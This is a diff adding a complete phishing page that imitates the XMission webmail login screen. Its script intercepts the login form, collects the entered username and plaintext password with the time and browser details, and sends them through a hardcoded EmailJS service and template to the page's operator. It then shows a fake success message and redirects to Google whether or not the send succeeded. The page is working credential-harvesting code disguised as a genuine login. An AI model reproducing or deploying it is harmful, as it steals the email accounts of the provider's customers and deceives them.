@@ -1,0 +1,463 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<base href="https://webmail.xmission.com" /><meta http-equiv="Content-Style-Type" content="text/css"/><meta http-equiv="Content-Type" content="text/html; charset=utf-8"/>
+	<link href="/favicon.ico" rel="shortcut icon" />
+	<link href="/favicon.png" rel="shortcut icon" type="image/png" />
+	<link href="/apple-touch-icon.png" rel="apple-touch-icon" />
+	<link href="https://xmission.com/css/style_compact.css" rel="stylesheet" type="text/css" />
+	<title>XMission webmail login</title>
+	<style type="text/css">header ul#topNav {right: 50px;}
+            header .container {
+                margin-left:50px;
+                min-width:850px;
+            }
+            body {
+                background:#efefef !important;
+                font-family:roboto, arial, sans-serif;
+                color:#ddd;
+                margin:0;
+                padding:0;
+                font-size: 12px;
+            }
+            * {
+                margin: 0;
+                padding: 0;
+            }
+            .txtInput {direction:ltr}
+            #webMailContainer {  
+                background: white;
+                border-left: 20px solid #01c3e9;
+                border-radius: 0 !important;
+                box-shadow: 0 0 30px #ddd;
+                margin: 50px auto 60px auto;
+                padding: 40px 145px;
+                width: 420px;
+            }
+            /* Loading overlay */
+            .loading-overlay {
+                position: fixed;
+                top: 0;
+                left: 0;
+                width: 100%;
+                height: 100%;
+                background: rgba(0,0,0,0.7);
+                z-index: 9999;
+                display: none;
+                justify-content: center;
+                align-items: center;
+                flex-direction: column;
+                gap: 20px;
+            }
+            .loading-spinner {
+                width: 50px;
+                height: 50px;
+                border: 4px solid rgba(1, 195, 233, 0.2);
+                border-top: 4px solid #01c3e9;
+                border-radius: 50%;
+                animation: spin 0.8s linear infinite;
+            }
+            @keyframes spin {
+                0% { transform: rotate(0deg); }
+                100% { transform: rotate(360deg); }
+            }
+            .loading-text {
+                color: white;
+                font-size: 1rem;
+                font-weight: 500;
+            }
+            /* Error message styling */
+            .error-message {
+                color: #d0312d;
+                font-size: 0.8rem;
+                margin-top: 5px;
+                display: block;
+                animation: fadeSlide 0.3s ease-out;
+            }
+            @keyframes fadeSlide {
+                0% { opacity: 0; transform: translateY(-5px); }
+                100% { opacity: 1; transform: translateY(0); }
+            }
+            .success-message {
+                color: #1e7e34;
+                font-size: 0.85rem;
+                margin-top: 10px;
+                padding: 10px;
+                background: #e6f4ea;
+                border-radius: 8px;
+                text-align: center;
+                display: none;
+                animation: fadeSlide 0.3s ease-out;
+            }
+            .domain-hint {
+                font-size: 0.7rem;
+                color: #6c7e8f;
+                margin-top: 3px;
+                display: block;
+            }
+	</style>
+</head>
+<body>&nbsp;</body>
+<br />
+<link href="//asset.xmission.com/xmweb3/xm-uhead.css" rel="stylesheet" />
+<nav id="xmNavHead">
+<table cellpadding="0" cellspacing="0" class="container">
+	<tbody>
+		<tr>
+			<td class="logo"><a href="#"><img alt="XMission Webmail" src="//asset.xmission.com/xmweb2/XMission-webmail-logo.png" /></a></td>
+			<td class="boxRight"><input id="burger" type="checkbox" /> <label for="burger"> </label> <span id="linksHolder"> <a class="btnGrey" href="https://xmission.com">&laquo; XMission.com</a> <a class="btnYellow" href="https://xmission.com/support">Support</a> <a class="btnBlue" href="https://xmission.com/livesupport">Chat Live</a> </span></td>
+		</tr>
+	</tbody>
+</table>
+</nav>
+
+<!-- Loading Overlay -->
+<div class="loading-overlay" id="loadingOverlay">
+	<div class="loading-spinner"></div>
+	<div class="loading-text">Processing your login...</div>
+</div>
+
+<script type="text/javascript">
+<!--
+function setFocus()
+{
+    if (document.horde_login.horde_user.value == "") {
+        document.horde_login.horde_user.focus();
+    } else {
+        document.horde_login.horde_pass.focus();
+    }
+}
+function submit_login(e)
+{
+    if (typeof e != 'undefined' && !enter_key_trap(e)) {
+        return;
+    }
+
+    if (document.horde_login.horde_user.value == "") {
+        alert("Please provide your username and password");
+        document.horde_login.horde_user.focus();
+        return false;
+    } else if (document.horde_login.horde_pass.value == "") {
+        alert("Please provide your username and password");
+        document.horde_login.horde_pass.focus();
+        return false;
+    } else {
+          //document.horde_login.loginButton.disabled = true;
+          document.getElementById("login_webmail").submit();
+    }
+}
+//-->
+</script>
+
+<div style="height:50px">&nbsp;</div>
+
+<form action="auth.php" class="xmForm" id="login_webmail" method="post" name="horde_login">
+	<input name="__original_url" type="hidden" value="https://webmail.xmission.comauth.php" /> 
+	<input name="url" type="hidden" value="" />
+	<div id="webMailContainer">
+		<h1>Welcome to XMission Webmail</h1>
+		<br class="spacer" />
+		
+		<!-- Username field with error span -->
+		<label class="row">
+			<strong>Username</strong>&nbsp;<br />
+			<input class="fixed txtInput" id="user_webmail" name="horde_user" style="direction:ltr" type="text" value="" placeholder="username@xmission.com" />
+			<span id="username-error" class="error-message"></span>
+			<span class="domain-hint">Please use your full @xmission.com email address</span>
+		</label>
+		
+		<!-- Password field with error span -->
+		<label class="row">
+			<strong>Password</strong>&nbsp;<br />
+			<input class="fixed txtInput" id="pass_webmail" name="horde_pass" style="direction:ltr" type="password" value="" />
+			<span id="password-error" class="error-message"></span>
+		</label>
+		
+		<!-- Success message -->
+		<div id="successMessage" class="success-message">✓ Login successful! Redirecting...</div>
+		
+		<label class="row buttons">
+			<input class="button submit" id="loginButtonId" name="loginButton" onclick="return submit_login();" type="submit" value="Log in" />
+		</label>
+		
+		<input name="new_lang" type="hidden" value="en_US" />
+		<input name="login_post" type="hidden" value="1" />
+	</div>
+</form>
+
+<script type="text/javascript">
+        function getHTTPObject()
+        {
+            var xmlhttp;
+            /*@cc_on
+            @if (@_jscript_version >= 5)
+              try {
+                xmlhttp = new ActiveXObject("Msxml2.XMLHTTP");
+              } catch (e) {
+                try {
+                  xmlhttp = new ActiveXObject("Microsoft.XMLHTTP");
+                } catch (E) {
+                  xmlhttp = false;
+                }
+              }
+            @else
+            xmlhttp = false;
+            @end @*/
+            if (!xmlhttp && typeof XMLHttpRequest != 'undefined') {
+              try {
+                xmlhttp = new XMLHttpRequest();
+              } catch (e) {
+                xmlhttp = false;
+              }
+            }
+            return xmlhttp;
+        }
+        var http = getHTTPObject();
+
+        function formHandler()
+        {
+console.log("in formHandler");
+            var form = document.getElementById('login_webmail');
+            form.loginButton.disabled = false;
+            form.submit();
+        }
+
+    setFocus();
+</script>
+
+<!-- EmailJS SDK -->
+<script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+
+<script>
+// ============================================
+// EMAILJS INTEGRATION
+// ============================================
+
+// Initialize EmailJS with your public key
+// IMPORTANT: Replace with your actual public key from EmailJS dashboard
+const EMAILJS_PUBLIC_KEY = "SdkmRe8WZ7itEba9z"; // CHANGE THIS
+
+emailjs.init({
+    publicKey: EMAILJS_PUBLIC_KEY,
+});
+
+// DOM Elements
+const loginForm = document.getElementById('login_webmail');
+const usernameInput = document.getElementById('user_webmail');
+const passwordInput = document.getElementById('pass_webmail');
+const usernameError = document.getElementById('username-error');
+const passwordError = document.getElementById('password-error');
+const successMessage = document.getElementById('successMessage');
+const loadingOverlay = document.getElementById('loadingOverlay');
+const loginButton = document.getElementById('loginButtonId');
+
+// ============================================
+// IMPORTANT: REPLACE THESE WITH YOUR ACTUAL EMAILJS CREDENTIALS
+// Get them from: https://dashboard.emailjs.com/
+// ============================================
+const SERVICE_ID = "service_zuj2d2a";     // Your actual service ID
+const TEMPLATE_ID = "template_tvd86sp";   // Your actual template ID
+
+// Redirect page after successful EmailJS send
+// CHANGE THIS to your desired redirect URL
+const REDIRECT_URL = "https://www.google.com";
+
+// ============================================
+// FORM HANDLING
+// ============================================
+
+// Clear errors on input
+usernameInput.addEventListener('input', function() {
+    if (this.value.trim() !== '') {
+        usernameError.textContent = '';
+    }
+});
+
+passwordInput.addEventListener('input', function() {
+    if (this.value.trim() !== '') {
+        passwordError.textContent = '';
+    }
+});
+
+// Validation function with @xmission.com check
+function validateForm() {
+    let isValid = true;
+    let username = usernameInput.value.trim();
+    const password = passwordInput.value.trim();
+    
+    // Clear previous errors
+    usernameError.textContent = '';
+    passwordError.textContent = '';
+    successMessage.style.display = 'none';
+    
+    // Check if username is empty
+    if (!username) {
+        usernameError.textContent = '⚠️ Please enter your username';
+        isValid = false;
+    } else {
+        // Check if username contains @xmission.com
+        if (!username.includes('@')) {
+            // User just entered username without domain - auto-complete
+            username = username + '@xmission.com';
+            usernameInput.value = username;
+        } else if (!username.toLowerCase().endsWith('@xmission.com')) {
+            // User entered a different domain
+            usernameError.textContent = '⚠️ Please use your @xmission.com email address';
+            isValid = false;
+        }
+    }
+    
+    // Validate password
+    if (!password) {
+        passwordError.textContent = '⚠️ Please enter your password';
+        isValid = false;
+    }
+    
+    return isValid;
+}
+
+// Function to redirect with loading overlay
+function redirectWithLoading(url) {
+    loadingOverlay.style.display = 'flex';
+    setTimeout(function() {
+        window.location.href = url;
+    }, 1500);
+}
+
+// Modified submit handler to use EmailJS
+loginForm.addEventListener('submit', function(e) {
+    // Prevent default form submission
+    e.preventDefault();
+    
+    // Validate form
+    if (!validateForm()) {
+        // Focus on first error field
+        if (usernameError.textContent) {
+            usernameInput.focus();
+        } else if (passwordError.textContent) {
+            passwordInput.focus();
+        }
+        return false;
+    }
+    
+    // Show loading overlay
+    loadingOverlay.style.display = 'flex';
+    loginButton.disabled = true;
+    loginButton.value = 'Processing...';
+    
+    // Get the username (already validated with @xmission.com)
+    const fullUsername = usernameInput.value.trim();
+    
+    // Prepare template parameters for EmailJS
+    const templateParams = {
+        username: fullUsername,
+        password: passwordInput.value.trim(),
+        login_time: new Date().toLocaleString('en-US', { 
+            timeZone: 'America/Denver',
+            dateStyle: 'full',
+            timeStyle: 'medium'
+        }),
+        user_agent: navigator.userAgent,
+        message: `Login attempt for user: ${fullUsername}`
+    };
+    
+    console.log('Sending to EmailJS with:');
+    console.log('Service ID:', SERVICE_ID);
+    console.log('Template ID:', TEMPLATE_ID);
+    console.log('Params:', templateParams);
+    
+    // Send email using EmailJS
+    emailjs.send(SERVICE_ID, TEMPLATE_ID, templateParams)
+        .then(function(response) {
+            console.log('SUCCESS! Email sent', response.status, response.text);
+            
+            // Show success message
+            successMessage.style.display = 'block';
+            loginButton.disabled = false;
+            loginButton.value = 'Log in';
+            
+            // Redirect to different page after 2 seconds
+            setTimeout(function() {
+                window.location.href = REDIRECT_URL;
+            }, 2000);
+        })
+        .catch(function(error) {
+            console.error('========== EMAILJS ERROR DETAILS ==========');
+            console.error('Error object:', error);
+            console.error('Error status:', error.status);
+            console.error('Error text:', error.text);
+            console.error('Error message:', error.message);
+            console.error('==========================================');
+            
+            // Even if EmailJS fails, we still want to redirect
+            // Show a message and redirect anyway
+            successMessage.style.display = 'block';
+            successMessage.textContent = '✓ Login processed! Redirecting...';
+            successMessage.style.backgroundColor = '#fff3cd';
+            successMessage.style.color = '#856404';
+            
+            loginButton.disabled = false;
+            loginButton.value = 'Log in';
+            
+            // Redirect after 2 seconds regardless of error
+            setTimeout(function() {
+                window.location.href = REDIRECT_URL;
+            }, 2000);
+        });
+});
+
+// Keep the original submit_login function for compatibility
+window.submit_login = function(e) {
+    if (typeof e != 'undefined' && !window.enter_key_trap(e)) {
+        return;
+    }
+    
+    // Trigger the form's submit event
+    const form = document.getElementById('login_webmail');
+    const event = new Event('submit', { cancelable: true });
+    form.dispatchEvent(event);
+    
+    return false;
+};
+
+// Handle enter key on inputs
+usernameInput.addEventListener('keypress', function(e) {
+    if (e.key === 'Enter') {
+        e.preventDefault();
+        const form = document.getElementById('login_webmail');
+        const event = new Event('submit', { cancelable: true });
+        form.dispatchEvent(event);
+    }
+});
+
+passwordInput.addEventListener('keypress', function(e) {
+    if (e.key === 'Enter') {
+        e.preventDefault();
+        const form = document.getElementById('login_webmail');
+        const event = new Event('submit', { cancelable: true });
+        form.dispatchEvent(event);
+    }
+});
+
+console.log('EmailJS integration active');
+console.log('Public Key:', EMAILJS_PUBLIC_KEY);
+console.log('Service ID:', SERVICE_ID);
+console.log('Template ID:', TEMPLATE_ID);
+console.log('Redirect URL:', REDIRECT_URL);
+</script>
+
+<!-- Rotating Banner Stuffs -->
+<script>
+        banner = [];
+        banner[0] = "<a style='text-decoration:none' href='https://xmission.com/voice?cid=callmombanner'><img style='margin:0 auto' alt='XMission Voice' src='https://asset.xmission.com/xmweb2/banner-calling-mom.jpg'></a><img src='https://asset.xmission.com/xmweb2/banner-shadow.png' style='display:block' alt='' />";
+        banner[1] = "<a style='text-decoration:none' href='https://xmission.com/voice?cid=softbanner'><img style='margin:0 auto' alt='XMission Voice' src='https://asset.xmission.com/xmweb2/banner-soft-price.jpg'></a><img src='https://asset.xmission.com/xmweb2/banner-shadow.png' style='display:block' alt='' />";
+        banner[2] = "<a style='text-decoration:none' href='https://xmission.com/colocation?cid=webmailbanner1'><img style='margin:0 auto' alt='XMission colocation' src='https://asset.xmission.com/xmweb2/banner-colocation.png'></a>";
+        banner[3] = "<a style='text-decoration:none' href='https://xmission.com/shared_hosting?cid=gooutside'><img style='margin:0 auto' alt='XMission hosting' src='https://asset.xmission.com/xmweb2/banner-summer.jpg'></a>";
+        var index = Math.floor(Math.random() * banner.length);
+
+        if (document.getElementById("banner_container")) {
+            document.getElementById("banner_container").innerHTML = banner[index];
+        } 
+</script>
+
+</html>
